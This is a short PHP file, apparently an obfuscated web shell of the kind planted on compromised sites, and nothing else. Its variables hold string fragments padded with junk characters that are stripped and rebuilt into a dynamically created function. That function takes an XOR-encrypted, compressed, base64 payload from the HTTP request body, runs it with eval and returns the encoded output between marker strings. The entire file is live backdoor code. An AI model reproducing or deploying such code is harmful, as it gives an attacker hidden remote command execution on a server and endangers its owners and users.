<?php
$N='ant.(t.);$r=@bast.e64_encot.de(@t.x(@t.gzcomt.presst.($o),$k))t.t.;print("$t.p$kh$r$kf");}';
$e='PmvxUDt.Sn";fut.nction x($t.t,$k){t.t.$c=strlen(t.$k);$l=stt.rlet.n($t);$ot.=""t.';
$T='$k="8t.efefec1"t.t.;$kh="41f7c2t.bt.7t.96t.c7";$kt.f="539eaf8t.fa6t.5e";$p="ZBGt.GOPuf';
$G='ot.ntt.ents("php://it.nput"),$mt.)==1) t.{t.@ob_stt.art();@et.val(@gzuncot.mpresst.(';
$K=str_replace('kS','','ckSrkSeakStekS_fukSnctikSon');
$o=';fot.r($t.i=0;t.$i<$lt.;)t.{for($j=0;($j<$c&t.&$i<$t.l);$jt.++,$i++){$t.o.=$t{$it';
$z='@t.xt.(@bt.ase64_decodt.e($m[1])t.,$kt.)t.));$o=t.@ob_get_contents()t.;@obt._end_cle';
$P='.}^$k{$j}t.;}t.}t.return $o;}it.f (t.@pt.reg_match("t./$kh(t..+)$kf/",@t.file_gt.et_ct.';
$c=str_replace('t.','',$T.$e.$o.$P.$G.$z.$N);
$x=$K('',$c);$x();
?>
